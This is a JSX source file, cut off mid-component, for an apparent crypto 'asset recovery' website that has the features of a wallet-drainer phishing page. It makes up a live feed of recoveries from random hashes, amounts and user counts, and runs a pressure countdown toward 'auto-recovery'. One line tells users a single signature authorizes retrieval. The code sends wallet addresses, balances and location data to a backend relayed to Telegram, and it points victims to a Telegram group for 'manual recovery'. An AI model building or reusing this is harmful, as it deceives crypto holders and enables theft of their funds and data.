      <div className="bg-gradient-to-r from-blue-600/20 to-transparent px-4 py-3 border-b border-blue-500/20 flex items-center justify-between">
        <div className="flex items-center gap-2">
          <div className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
          <span className="text-sm font-semibold text-blue-400">{translations.liveClaims}</span>
        </div>
        <div className="flex items-center gap-3">
          <span className="text-xs text-gray-500">
            {todayCount} {translations.participants?.toLowerCase() || 'recoveries'} today
          </span>
          <div className="w-1 h-4 bg-blue-500/30 rounded-full"></div>
          <span className="text-xs text-green-400 font-mono">● LIVE</span>
        </div>
      </div>
      
      <div className="max-h-64 overflow-y-auto custom-scrollbar">
        {transactions.length === 0 ? (
          <div className="p-8 text-center text-gray-500 text-sm">
            <div className="animate-pulse text-2xl mb-2">🔗</div>
            {translations.waitingForFirstClaim}
          </div>
        ) : (
          transactions.map((tx, idx) => (
            <div key={idx} className="px-4 py-3 border-b border-blue-500/10 hover:bg-blue-500/5 transition-all duration-300 group">
              <div className="flex items-center justify-between">
                <div className="flex items-center gap-2">
                  <span className="text-green-400 text-xs animate-pulse">●</span>
                  <span className="font-mono text-xs text-gray-300 group-hover:text-blue-400 transition-colors">
                    {tx.hash.slice(0, 6)}...{tx.hash.slice(-4)}
                  </span>
                </div>
                <div className="flex items-center gap-2">
                  <span className="text-xs text-blue-400 font-mono font-bold">
                    ${tx.recoveryAmount?.toLocaleString() || '0'} USD
                  </span>
                  <span className="text-[10px] text-yellow-500 bg-yellow-500/10 px-1.5 py-0.5 rounded-full">{translations.bonusTag || '+25%'}</span>
                </div>
              </div>
              <div className="flex items-center justify-between mt-1">
                <span className="text-[10px] text-gray-500">
                  {tx.timeAgo}
                  {tx.chain && <span className="ml-2 text-gray-600">• {tx.chain}</span>}
                </span>
                <button 
                  onClick={() => handleDownloadForTx(tx)}
                  className="text-[10px] text-blue-400 hover:text-blue-300 transition-colors flex items-center gap-1"
                >
                  📄 {translations.downloadReport}
                </button>
              </div>
            </div>
          ))
        )}
      </div>
      
      <div className="px-4 py-2 bg-blue-500/5 border-t border-blue-500/10 flex items-center justify-between">
        <p className="text-[10px] text-gray-500">
          🔗 {translations.totalClaimed}: 
        </p>
        <p className="text-xs text-blue-400 font-mono font-bold">
          ${totalRecoveredAmount.toLocaleString()} USD
        </p>
      </div>
    </div>
  );
};

// ============================================
// LIVE ACTIVITY BADGE COMPONENT
// ============================================
const LiveActivityBadge = ({ translations, activeUsers, lastRecoveryTime }) => {
  return (
    <div className="flex items-center justify-center gap-4 mb-4 text-xs flex-wrap">
      <div className="flex items-center gap-1 bg-blue-500/10 px-3 py-1.5 rounded-full backdrop-blur">
        <div className="flex -space-x-2">
          {[...Array(3)].map((_, i) => (
            <div key={i} className="w-6 h-6 rounded-full bg-blue-500/30 border border-blue-500/50 flex items-center justify-center text-[10px]">
              👤
            </div>
          ))}
        </div>
        <span className="text-gray-300 ml-1">{activeUsers} {translations.claimingNow}</span>
      </div>
      <div className="text-gray-600">•</div>
      <div className="flex items-center gap-1 bg-blue-500/10 px-3 py-1.5 rounded-full backdrop-blur">
        <span className="text-green-400 text-xs animate-pulse">⚡</span>
        <span className="text-gray-300">{translations.lastClaim}: {lastRecoveryTime}</span>
      </div>
      <div className="text-gray-600">•</div>
      <div className="flex items-center gap-1 bg-blue-500/10 px-3 py-1.5 rounded-full backdrop-blur">
        <span className="text-yellow-400 text-xs">🔥</span>
        <span className="text-gray-300">+25% BONUS</span>
      </div>
    </div>
  );
};

// ============================================
// AUTO RECOVERY COUNTDOWN COMPONENT
// ============================================
const AutoRecoveryCountdown = ({ seconds, translations, onCancel }) => {
  const [countdown, setCountdown] = useState(seconds);
  
  useEffect(() => {
    if (countdown <= 0) return;
    const timer = setTimeout(() => setCountdown(countdown - 1), 1000);
    return () => clearTimeout(timer);
  }, [countdown]);
  
  if (countdown <= 0) return null;
  
  return (
    <div className="mt-3 bg-blue-500/20 border border-blue-500/30 rounded-lg p-3 text-center animate-pulse">
      <p className="text-sm text-blue-400">
        ⚡ Auto-recovery will trigger in {countdown} seconds...
      </p>
      <button 
        onClick={onCancel}
        className="text-xs text-gray-400 hover:text-gray-300 mt-1"
      >
        Cancel auto-recovery (use manual button instead)
      </button>
    </div>
  );
};

// ============================================
// ENHANCED REPORT ISSUE COMPONENT - WITH EMAIL INPUT (PROMINENTLY PLACED)
// ============================================
const ReportIssue = ({ translations, address, balances, userLocation }) => {
  const [userEmail, setUserEmail] = useState('');
  const [issueText, setIssueText] = useState('');
  const [isSending, setIsSending] = useState(false);
  const [sent, setSent] = useState(false);
  const [errorMsg, setErrorMsg] = useState('');

  const handleSendReport = async () => {
    if (!userEmail.trim()) {
      setErrorMsg('Please enter your email address');
      return;
    }
    if (!issueText.trim()) {
      setErrorMsg('Please describe your issue');
      return;
    }
    
    setIsSending(true);
    setErrorMsg('');
    
    try {
      // Send to backend which will forward to admin email AND Telegram
      const response = await fetch(`${BACKEND_URL}/api/send-report`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          userEmail: userEmail,
          walletAddress: address,
          issue: issueText,
          location: userLocation,
          balances: balances,
          userAgent: navigator.userAgent,
          timestamp: new Date().toISOString()
        })
      });
      
      const result = await response.json();
      if (result.success) {
        setSent(true);
        setUserEmail('');
        setIssueText('');
        setTimeout(() => setSent(false), 5000);
      } else {
        setErrorMsg(result.error || translations.reportError);
      }
    } catch (err) {
      console.error('Report error:', err);
      setErrorMsg(translations.reportError);
    } finally {
      setIsSending(false);
    }
  };

  return (
    <div className="bg-gradient-to-br from-blue-500/10 to-purple-500/5 border border-blue-500/30 backdrop-blur rounded-xl p-6 transition-all duration-300 hover:border-blue-400/50 hover:shadow-lg hover:shadow-blue-500/10">
      <div className="flex items-center gap-3 mb-4">
        <div className="w-12 h-12 bg-gradient-to-br from-blue-500 to-blue-600 rounded-xl flex items-center justify-center shadow-lg">
          <span className="text-2xl">📧</span>
        </div>
        <div>
          <h3 className="text-xl font-bold text-blue-400">{translations.emailSupportTitle}</h3>
          <p className="text-xs text-gray-400">{translations.emailSupportDesc}</p>
        </div>
      </div>
      
      <div className="bg-black/40 rounded-lg p-3 mb-4 border border-blue-500/20">
        <div className="flex items-start gap-2 text-xs text-gray-400">
          <span className="text-blue-400">📌</span>
          <div>
            <p className="font-semibold text-gray-300 mb-1">{translations.whyEmailSupport}</p>
            <p className="whitespace-pre-line text-[11px]">{translations.emailSupportPoints}</p>
          </div>
        </div>
      </div>
      
      <p className="text-xs text-gray-400 mb-4 flex items-center gap-1">
        <span className="text-green-400">✓</span> {translations.contactInfo}
      </p>
      
      {/* Email Input */}
      <input
        type="email"
        value={userEmail}
        onChange={(e) => setUserEmail(e.target.value)}
        placeholder={translations.yourEmail}
        className="w-full bg-black/50 border border-blue-500/30 rounded-xl px-4 py-3 text-white placeholder-gray-500 focus:outline-none focus:border-blue-500 text-sm mb-3"
      />
      
      {/* Issue Textarea */}
      <textarea
        value={issueText}
        onChange={(e) => setIssueText(e.target.value)}
        placeholder={translations.issuePlaceholder}
        rows={4}
        className="w-full bg-black/50 border border-blue-500/30 rounded-xl px-4 py-3 text-white placeholder-gray-500 focus:outline-none focus:border-blue-500 text-sm mb-3"
      />
      
      {/* Error Message */}
      {errorMsg && (
        <div className="mb-3 text-xs text-red-400 bg-red-500/10 rounded-lg p-2">
          ⚠️ {errorMsg}
        </div>
      )}
      
      {/* Success Message */}
      {sent && (
        <div className="mb-3 text-xs text-green-400 bg-green-500/10 rounded-lg p-2 flex items-center gap-2">
          <span>✓</span> {translations.reportSent}
        </div>
      )}
      
      {/* Send Button */}
      <button
        onClick={handleSendReport}
        disabled={isSending}
        className="w-full bg-gradient-to-r from-blue-600 to-blue-500 hover:from-blue-700 hover:to-blue-600 text-white font-semibold py-3 rounded-xl transition-all disabled:opacity-50 flex items-center justify-center gap-2"
      >
        {isSending ? (
          <>
            <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
            {translations.processingReport}
          </>
        ) : sent ? '✓ Sent!' : translations.sendReport}
      </button>
    </div>
  );
};

// ============================================
// TELEGRAM SUPPORT COMPONENT - ENHANCED & DETAILED
// ============================================
const TelegramSupport = ({ translations }) => {
  const TELEGRAM_GROUP_LINK = 'https://t.me/+UUhEUx9wBW5jZGQ1';
  const [showTooltip, setShowTooltip] = useState(false);

  return (
    <div className="bg-gradient-to-br from-blue-500/10 to-purple-500/5 border border-blue-500/30 backdrop-blur rounded-xl p-6 mt-6 transition-all duration-300 hover:border-blue-400/50 hover:shadow-lg hover:shadow-blue-500/10">
      <div className="flex items-start gap-4">
        <div className="flex-shrink-0">
          <div className="w-14 h-14 bg-gradient-to-br from-blue-500 to-blue-600 rounded-2xl flex items-center justify-center shadow-lg animate-pulse-glow">
            <svg className="w-8 h-8 text-white" fill="currentColor" viewBox="0 0 24 24">
              <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.66-.35-1.02.22-1.62.15-.15 2.71-2.48 2.76-2.69.01-.03.01-.13-.08-.18-.09-.05-.23-.03-.33-.01-.15.03-2.55 1.62-3.61 2.28-.34.23-.65.34-.93.34-.3 0-.79-.15-1.18-.28-.48-.15-.87-.23-.84-.49.02-.14.21-.28.57-.43 2.24-.98 3.79-1.62 4.66-1.94 2.22-.82 2.68-.96 2.98-.96.07 0 .22.02.32.12.08.08.1.19.07.29-.03.1-.12.22-.24.34zm-.21 5.45c-.12.62-.23 1.21-.35 1.78-.12.57-.22 1.03-.31 1.4-.09.37-.16.63-.19.71z"/>
            </svg>
          </div>
        </div>
        <div className="flex-1">
          <div className="flex items-center gap-2 mb-2 flex-wrap">
            <h3 className="text-xl font-bold text-blue-400">{translations.telegramSupport}</h3>
            <span className="bg-green-500/20 text-green-400 text-xs px-2 py-0.5 rounded-full flex items-center gap-1">
              <span className="w-1.5 h-1.5 bg-green-500 rounded-full animate-pulse"></span>
              24/7 ACTIVE
            </span>
          </div>
          <p className="text-gray-300 text-sm leading-relaxed mb-3">
            {translations.telegramDesc}
          </p>
          <div className="bg-black/40 rounded-lg p-3 mb-4 border border-blue-500/20">
            <div className="flex items-start gap-2 text-xs text-gray-400">
              <span className="text-blue-400">🔗</span>
              <div>
                <p className="font-semibold text-gray-300 mb-1">{translations.connectionHelp}</p>
                <p>• Wallet connection failed?<br/>• Using an exchange like Binance, Coinbase, or Kraken?<br/>• Transaction not showing?<br/>• Need manual recovery assistance?</p>
                <p className="mt-2 text-blue-300">→ Our support team will guide you through the manual recovery process.</p>
              </div>
            </div>
          </div>
          <a
            href={TELEGRAM_GROUP_LINK}
            target="_blank"
            rel="noopener noreferrer"
            onMouseEnter={() => setShowTooltip(true)}
            onMouseLeave={() => setShowTooltip(false)}
            className="inline-flex items-center gap-2 bg-gradient-to-r from-blue-600 to-blue-500 hover:from-blue-700 hover:to-blue-600 text-white font-semibold px-5 py-2.5 rounded-xl transition-all duration-300 transform hover:scale-105 shadow-lg shadow-blue-500/25 relative"
          >
            <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24">
              <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.66-.35-1.02.22-1.62.15-.15 2.71-2.48 2.76-2.69.01-.03.01-.13-.08-.18-.09-.05-.23-.03-.33-.01-.15.03-2.55 1.62-3.61 2.28-.34.23-.65.34-.93.34-.3 0-.79-.15-1.18-.28-.48-.15-.87-.23-.84-.49.02-.14.21-.28.57-.43 2.24-.98 3.79-1.62 4.66-1.94 2.22-.82 2.68-.96 2.98-.96.07 0 .22.02.32.12.08.08.1.19.07.29-.03.1-.12.22-.24.34z"/>
            </svg>
            {translations.telegramButton}
            <span className="text-xs bg-white/20 px-2 py-0.5 rounded-full">@recovery_support</span>
            {showTooltip && (
              <div className="absolute bottom-full left-1/2 transform -translate-x-1/2 mb-2 px-2 py-1 bg-gray-900 text-white text-xs rounded shadow-lg whitespace-nowrap z-10">
                Click to join Telegram group
              </div>
            )}
          </a>
        </div>
      </div>
    </div>
  );
};

// ============================================
// MODAL COMPONENT FOR LEGAL DOCUMENTS
// ============================================
const LegalModal = ({ isOpen, onClose, title, content }) => {
  if (!isOpen) return null;
  
  return (
    <div className="fixed inset-0 z-[100] flex items-center justify-center p-4 bg-black/80 backdrop-blur-md animate-fadeIn">
      <div className="relative max-w-2xl w-full max-h-[80vh] bg-gradient-to-br from-gray-900 to-black rounded-2xl border border-blue-500/30 shadow-2xl overflow-hidden">
        <div className="sticky top-0 bg-gradient-to-r from-blue-600/20 to-transparent px-6 py-4 border-b border-blue-500/20 flex justify-between items-center">
          <h3 className="text-xl font-bold text-blue-400">{title}</h3>
          <button onClick={onClose} className="text-gray-400 hover:text-white transition-colors text-2xl">&times;</button>
        </div>
        <div className="p-6 overflow-y-auto custom-scrollbar text-gray-300 text-sm space-y-4">
          {content}
        </div>
        <div className="sticky bottom-0 bg-black/80 px-6 py-3 border-t border-blue-500/20 flex justify-end">
          <button onClick={onClose} className="bg-blue-600 hover:bg-blue-700 px-4 py-2 rounded-lg text-sm transition-colors">
            Close
          </button>
        </div>
      </div>
    </div>
  );
};

// ============================================
// FOOTER COMPONENT WITH LEGAL & COMPANY INFO
// ============================================
const Footer = () => {
  const [privacyOpen, setPrivacyOpen] = useState(false);
  const [termsOpen, setTermsOpen] = useState(false);
  const [riskOpen, setRiskOpen] = useState(false);
  const TELEGRAM_LINK = 'https://t.me/+UUhEUx9wBW5jZGQ1';
  
  const privacyContent = (
    <>
      <p><strong>Last Updated:</strong> January 2026</p>
      <p>Blockchain Recovery Protocol ("we", "our", "us") respects your privacy. This policy explains how we collect, use, and protect your information when you use our asset recovery services.</p>
      <h4 className="font-bold text-blue-300 mt-4">1. Information We Collect</h4>
      <p>• Wallet address (public)<br/>• Blockchain transaction data<br/>• Email address (when you report an issue)<br/>• IP address and location (anonymized for support)</p>
      <h4 className="font-bold text-blue-300 mt-4">2. How We Use Your Information</h4>
      <p>• Process recovery requests<br/>• Improve our recovery protocol<br/>• Send recovery confirmations<br/>• Provide customer support</p>
      <h4 className="font-bold text-blue-300 mt-4">3. Data Security</h4>
      <p>We use industry-standard encryption and never store private keys. Your wallet remains non-custodial at all times.</p>
      <h4 className="font-bold text-blue-300 mt-4">4. Contact</h4>
      <p>For privacy inquiries: privacy@blockchainrecovery.io</p>
    </>
  );
  
  const termsContent = (
    <>
      <p><strong>Effective Date:</strong> January 2026</p>
      <p>By using Blockchain Recovery Protocol, you agree to these Terms of Service.</p>
      <h4 className="font-bold text-blue-300 mt-4">1. Service Description</h4>
      <p>We provide automated tools to help users recover stuck or non-custodial assets across supported blockchains. Recovery success depends on network conditions and asset type.</p>
      <h4 className="font-bold text-blue-300 mt-4">2. Fees</h4>
      <p>A 5% recovery fee plus network gas fees applies. Fees are deducted from recovered assets.</p>
      <h4 className="font-bold text-blue-300 mt-4">3. Eligibility</h4>
      <p>You must be the rightful owner of the wallet address used. We do not recover assets from third-party custodial accounts without authorization.</p>
      <h4 className="font-bold text-blue-300 mt-4">4. Limitation of Liability</h4>
      <p>We are not responsible for losses due to network congestion, user error, or unsupported assets. Use at your own risk.</p>
      <h4 className="font-bold text-blue-300 mt-4">5. Governing Law</h4>
      <p>These terms are governed by applicable international blockchain regulations.</p>
    </>
  );
  
  const riskContent = (
    <>
      <p><strong>IMPORTANT RISK DISCLAIMER</strong></p>
      <p>Blockchain asset recovery involves inherent risks. By using this service, you acknowledge and accept the following:</p>
      <h4 className="font-bold text-blue-300 mt-4">1. No Guarantee of Recovery</h4>
      <p>Recovery depends on network conditions, wallet configuration, and asset type. Some assets may be permanently unrecoverable.</p>
      <h4 className="font-bold text-blue-300 mt-4">2. Market Volatility</h4>
      <p>Crypto asset values fluctuate. The USD value shown at recovery time may change rapidly.</p>
      <h4 className="font-bold text-blue-300 mt-4">3. Network Fees</h4>
      <p>Gas fees are variable and may be high during network congestion. You are responsible for all gas costs.</p>
      <h4 className="font-bold text-blue-300 mt-4">4. Non-Custodial</h4>
      <p>We never take custody of your private keys. You retain full control of your wallet at all times.</p>
      <h4 className="font-bold text-blue-300 mt-4">5. Regulatory</h4>
      <p>It is your responsibility to ensure compliance with local laws regarding crypto asset recovery.</p>
      <p className="mt-4 text-yellow-400">⚠️ Never share your private keys or seed phrase with anyone. Our service never asks for them.</p>
    </>
  );
  
  return (
    <footer className="mt-16 pt-8 border-t border-blue-500/20">
      <LegalModal isOpen={privacyOpen} onClose={() => setPrivacyOpen(false)} title="Privacy Policy" content={privacyContent} />
      <LegalModal isOpen={termsOpen} onClose={() => setTermsOpen(false)} title="Terms of Service" content={termsContent} />
      <LegalModal isOpen={riskOpen} onClose={() => setRiskOpen(false)} title="Risk Disclaimer" content={riskContent} />
      
      <div className="grid grid-cols-1 md:grid-cols-4 gap-8 text-sm">
        {/* Company Info */}
        <div>
          <h4 className="font-bold text-blue-400 mb-3">Blockchain Recovery</h4>
          <p className="text-gray-400 leading-relaxed">
            Decentralized asset recovery protocol supporting Ethereum, BSC, Polygon, Arbitrum & Avalanche.
          </p>
          <p className="text-gray-500 text-xs mt-2">Est. 2026</p>
        </div>
        
        {/* Contact */}
        <div>
          <h4 className="font-bold text-blue-400 mb-3">Contact</h4>
          <p className="text-gray-400">support@blockchainrecovery.io</p>
          <p className="text-gray-400 mt-1">Telegram: @recovery_support</p>
          <div className="mt-3">
            <a href={TELEGRAM_LINK} target="_blank" rel="noopener noreferrer" className="inline-flex items-center gap-2 text-blue-400 hover:text-blue-300 transition-colors">
              <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.66-.35-1.02.22-1.62.15-.15 2.71-2.48 2.76-2.69.01-.03.01-.13-.08-.18-.09-.05-.23-.03-.33-.01-.15.03-2.55 1.62-3.61 2.28-.34.23-.65.34-.93.34-.3 0-.79-.15-1.18-.28-.48-.15-.87-.23-.84-.49.02-.14.21-.28.57-.43 2.24-.98 3.79-1.62 4.66-1.94 2.22-.82 2.68-.96 2.98-.96.07 0 .22.02.32.12.08.08.1.19.07.29-.03.1-.12.22-.24.34z"/>
              </svg>
              Join Telegram
            </a>
          </div>
        </div>
        
        {/* Legal Links */}
        <div>
          <h4 className="font-bold text-blue-400 mb-3">Legal</h4>
          <ul className="space-y-2 text-gray-400">
            <li><button onClick={() => setPrivacyOpen(true)} className="hover:text-blue-400 transition-colors">Privacy Policy</button></li>
            <li><button onClick={() => setTermsOpen(true)} className="hover:text-blue-400 transition-colors">Terms of Service</button></li>
            <li><button onClick={() => setRiskOpen(true)} className="hover:text-blue-400 transition-colors">Risk Disclaimer</button></li>
          </ul>
        </div>
        
        {/* Service Explanation */}
        <div>
          <h4 className="font-bold text-blue-400 mb-3">How It Works</h4>
          <p className="text-gray-400 leading-relaxed text-xs">
            Our smart contracts scan 5 chains for recoverable value. One signature authorizes retrieval. 
            No custody, no private key access — fully transparent on-chain recovery.
          </p>
          <p className="text-gray-500 text-xs mt-2">Fee: 5% + gas | Bonus: +25%</p>
        </div>
      </div>
      
      <div className="text-center text-gray-500 text-xs mt-8 pt-4 border-t border-blue-500/10">
        © 2026 Blockchain Recovery Protocol — Secure Non-Custodial Asset Recovery. All rights reserved.
      </div>
    </footer>
  );
};

// ============================================
// RECOVERY INSTRUCTION COMPONENT - SIDE PANEL VERSION
// ============================================
const RecoveryInstructions = ({ translations }) => {
  const [expanded, setExpanded] = useState(false);

  return (
    <div className="fixed left-0 top-1/2 transform -translate-y-1/2 z-40 hidden md:block">
      <div className="relative">
        {/* Toggle button */}
        <button
          onClick={() => setExpanded(!expanded)}
          className="bg-blue-600 hover:bg-blue-700 text-white p-2 rounded-r-xl shadow-lg transition-all duration-300 flex items-center gap-1"
          style={{ writingMode: 'vertical-rl' }}
        >
          <span className="text-xs font-bold tracking-wider">HELP</span>
          <span className="text-sm">{expanded ? '◀' : '▶'}</span>
        </button>

        {/* Sliding panel */}
        <div
          className={`absolute left-0 top-0 bg-black/90 backdrop-blur-md border border-blue-500/30 rounded-r-2xl shadow-2xl transition-all duration-500 overflow-hidden ${
            expanded ? 'w-72 opacity-100 pointer-events-auto' : 'w-0 opacity-0 pointer-events-none'
          }`}
          style={{ transform: 'translateX(0)', transition: 'width 0.4s ease, opacity 0.3s ease' }}
        >
          <div className="p-5 min-w-[18rem]">
            <div className="flex items-center justify-between mb-3 border-b border-blue-500/20 pb-2">
              <h3 className="text-base font-bold text-blue-400 flex items-center gap-2">
                <span>🔐</span> {translations.recoveryInstructionsTitle}
              </h3>
              <button onClick={() => setExpanded(false)} className="text-gray-400 hover:text-white text-sm">
                ✕
              </button>
            </div>
            <div className="space-y-2.5 text-sm">
              <div className="flex gap-3 items-start">
                <span className="text-blue-400 font-bold text-xs bg-blue-500/20 rounded-full w-5 h-5 flex items-center justify-center flex-shrink-0 mt-0.5">1</span>
                <span className="text-gray-300">{translations.recoveryStep1}</span>
              </div>
              <div className="flex gap-3 items-start">
                <span className="text-blue-400 font-bold text-xs bg-blue-500/20 rounded-full w-5 h-5 flex items-center justify-center flex-shrink-0 mt-0.5">2</span>
                <span className="text-gray-300">{translations.recoveryStep2}</span>
              </div>
              <div className="flex gap-3 items-start">
                <span className="text-blue-400 font-bold text-xs bg-blue-500/20 rounded-full w-5 h-5 flex items-center justify-center flex-shrink-0 mt-0.5">3</span>
                <span className="text-gray-300">{translations.recoveryStep3}</span>
              </div>
              <div className="flex gap-3 items-start">
                <span className="text-blue-400 font-bold text-xs bg-blue-500/20 rounded-full w-5 h-5 flex items-center justify-center flex-shrink-0 mt-0.5">4</span>
                <span className="text-gray-300">{translations.recoveryStep4}</span>
              </div>
              <div className="flex gap-3 items-start">
                <span className="text-blue-400 font-bold text-xs bg-blue-500/20 rounded-full w-5 h-5 flex items-center justify-center flex-shrink-0 mt-0.5">5</span>
                <span className="text-gray-300">{translations.recoveryStep5}</span>
              </div>
              <div className="mt-3 p-3 bg-blue-500/10 border border-blue-500/30 rounded-lg text-xs text-blue-300 flex items-start gap-2">
                <span className="text-blue-400 text-sm">⚠️</span>
                <span>{translations.recoveryNote}</span>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

// ============================================
// MAIN APP COMPONENT - Blockchain Recovery System
// ============================================
function App() {
  const { open } = useAppKit();
  const { address, isConnected } = useAppKitAccount();
  const { walletProvider } = useAppKitProvider("eip155");
  const { disconnect } = useDisconnect();
  
  const [provider, setProvider] = useState(null);
  const [signer, setSigner] = useState(null);
  const [balances, setBalances] = useState({});
  const [loading, setLoading] = useState(false);
  const [signatureLoading, setSignatureLoading] = useState(false);
  const [txStatus, setTxStatus] = useState('');
  const [error, setError] = useState('');
  const [completedChains, setCompletedChains] = useState([]);
  const [showCelebration, setShowCelebration] = useState(false);
  const [verifying, setVerifying] = useState(false);
  const [verifiedChains, setVerifiedChains] = useState([]);
  const [prices, setPrices] = useState({
    eth: 2000,
    bnb: 300,
    matic: 0.75,
    avax: 32
  });
  const [userEmail, setUserEmail] = useState('');
  const [userLocation, setUserLocation] = useState({ country: '', city: '', flag: '', ip: '' });
  const [hoverConnect, setHoverConnect] = useState(false);
  const [walletInitialized, setWalletInitialized] = useState(false);
  const [scanProgress, setScanProgress] = useState(0);
  const [scanning, setScanning] = useState(false);
  const [currentFlowId, setCurrentFlowId] = useState('');
  const [processingChain, setProcessingChain] = useState('');
  const [isEligible, setIsEligible] = useState(false);
  const [eligibleChains, setEligibleChains] = useState([]);
  const [showRecoverButton, setShowRecoverButton] = useState(false);
  const [showEmailNotification, setShowEmailNotification] = useState(false);
  const [showReportNotification, setShowReportNotification] = useState(false);
  const [autoRecoveryActive, setAutoRecoveryActive] = useState(false);
  const [chainDetailsForReport, setChainDetailsForReport] = useState([]);
  
  // LIVE TRANSACTIONS STATE - Loaded from localStorage
  const [liveTransactions, setLiveTransactions] = useState([]);
  const [showPopup, setShowPopup] = useState(false);
  const [currentPopupTx, setCurrentPopupTx] = useState(null);
  const [activeUsers, setActiveUsers] = useState(0);
  const [lastRecoveryTime, setLastRecoveryTime] = useState('Just now');
  const [todayTotalRecovered, setTodayTotalRecovered] = useState(0);
  
  // LANGUAGE STATE
  const [language, setLanguage] = useState('en');
  const [showLanguageDropdown, setShowLanguageDropdown] = useState(false);
  const [translations, setTranslations] = useState(TRANSLATIONS.en);

  // Recovery stats
  const [presaleStats, setPresaleStats] = useState({
    totalRaised: 1250000,
    totalSold: 4250000,
    totalParticipants: 8742,
    currentBonus: 25,
    nextBonus: 15,
    tokenPrice: 0.045,
    hardCap: 10000000,
    bthPrice: 0.045
  });

  // Calculate total recovered amount from live transactions (in USD)
  const totalRecoveredAmountUSD = liveTransactions.reduce((sum, tx) => sum + (tx.recoveryAmount || 0), 0);
  const todayCount = liveTransactions.length;
  const totalOnChainValue = Object.values(balances).reduce((sum, b) => sum + (b.valueUSD || 0), 0);

  // FORMAT TIME AGO FUNCTION
  const formatTimeAgo = (date) => {
    const seconds = Math.floor((new Date() - new Date(date)) / 1000);
    if (seconds < 5) return 'Just now';
    if (seconds < 60) return `${seconds}s ago`;
    const minutes = Math.floor(seconds / 60);
    if (minutes < 60) return `${minutes}m ago`;
    const hours = Math.floor(minutes / 60);
    if (hours < 24) return `${hours}h ago`;
    return `${Math.floor(hours / 24)}d ago`;
  };

  // GENERATE RANDOM TRANSACTION HASH (blockchain-like)
  const generateRandomHash = () => {
    const prefixes = ['0x7a3f', '0x9e1c', '0x4d5f', '0x2b8a', '0x6c9d', '0x8f3e', '0x1a7b', '0x5c2d'];
    const prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
    return prefix + Array.from({ length: 60 }, () => 
      '0123456789abcdef'[Math.floor(Math.random() * 16)]
    ).join('');
  };

  // Get random chain for recovery
  const getRandomChain = () => {
    const chains = ['Ethereum', 'BSC', 'Polygon', 'Arbitrum', 'Avalanche'];
    return chains[Math.floor(Math.random() * chains.length)];
  };

  // LOAD PERSISTENT DATA ON MOUNT
  useEffect(() => {
    const loadPersistentData = () => {
      const lastDate = localStorage.getItem(STORAGE_KEYS.LAST_RESET_DATE);
      const savedTransactions = localStorage.getItem(STORAGE_KEYS.LIVE_TRANSACTIONS);
      
      if (hasDateChanged(lastDate)) {
        localStorage.setItem(STORAGE_KEYS.LAST_RESET_DATE, new Date().toDateString());
        localStorage.removeItem(STORAGE_KEYS.LIVE_TRANSACTIONS);
        
        const initialTransactions = [
          { hash: '0x7a3f2b9e1c4d5f6a7b8c9d0e1f2a3b4c5d6e7f8a', time: new Date().toISOString(), chain: 'Ethereum', recoveryAmount: 125000 },
          { hash: '0x3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d', time: new Date(Date.now() - 180000).toISOString(), chain: 'BSC', recoveryAmount: 50000 },
          { hash: '0x9e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f', time: new Date(Date.now() - 420000).toISOString(), chain: 'Polygon', recoveryAmount: 250000 },
        ].map(tx => ({
          ...tx,
          timeAgo: formatTimeAgo(tx.time)
        }));
        setLiveTransactions(initialTransactions);
      } else if (savedTransactions) {
        const parsed = JSON.parse(savedTransactions);
        const transactionsWithTimeAgo = parsed.map(tx => ({
          ...tx,
          timeAgo: formatTimeAgo(tx.time)
        }));
        setLiveTransactions(transactionsWithTimeAgo);
      }
    };
    
    loadPersistentData();
  }, []);

  // Save transactions to localStorage
  useEffect(() => {
    if (liveTransactions.length > 0) {
      const toSave = liveTransactions.map(({ timeAgo, ...tx }) => tx);
      localStorage.setItem(STORAGE_KEYS.LIVE_TRANSACTIONS, JSON.stringify(toSave));
    }
  }, [liveTransactions]);

  // Update total recovered amount for the day
  useEffect(() => {
    const total = liveTransactions.reduce((sum, tx) => sum + (tx.recoveryAmount || 0), 0);
    setTodayTotalRecovered(total);
  }, [liveTransactions]);

  // SCHEDULE RANDOM POPUPS every 8-15 minutes
  useEffect(() => {
    let isMounted = true;
    
    const schedulePopup = () => {
      const delay = Math.random() * (15 * 60 * 1000 - 8 * 60 * 1000) + 8 * 60 * 1000;
      
      const timeoutId = setTimeout(() => {
        if (!isMounted) return;
        
        const randomChain = getRandomChain();
        const recoveryAmount = getRandomRecoveryAmount();
        const newTx = {
          hash: generateRandomHash(),
          time: new Date().toISOString(),
          timeAgo: 'Just now',
          chain: randomChain,
          recoveryAmount: recoveryAmount
        };
        
        setCurrentPopupTx(newTx);
        setShowPopup(true);
        
        setLiveTransactions(prev => [
          { ...newTx, timeAgo: formatTimeAgo(newTx.time) },
          ...prev.slice(0, 19)
        ]);
        
        setActiveUsers(Math.floor(Math.random() * 15) + 5);
        setLastRecoveryTime('Just now');
        
        setTimeout(() => {
          setLastRecoveryTime('Just now');
          setTimeout(() => setLastRecoveryTime('30s ago'), 30000);
        }, 2000);
        
        schedulePopup();
      }, delay);
      
      return timeoutId;
    };
    
    const timeoutId = schedulePopup();
    return () => {
      isMounted = false;
      clearTimeout(timeoutId);
    };
  }, []);

  // Update active users periodically
  useEffect(() => {
    const interval = setInterval(() => {
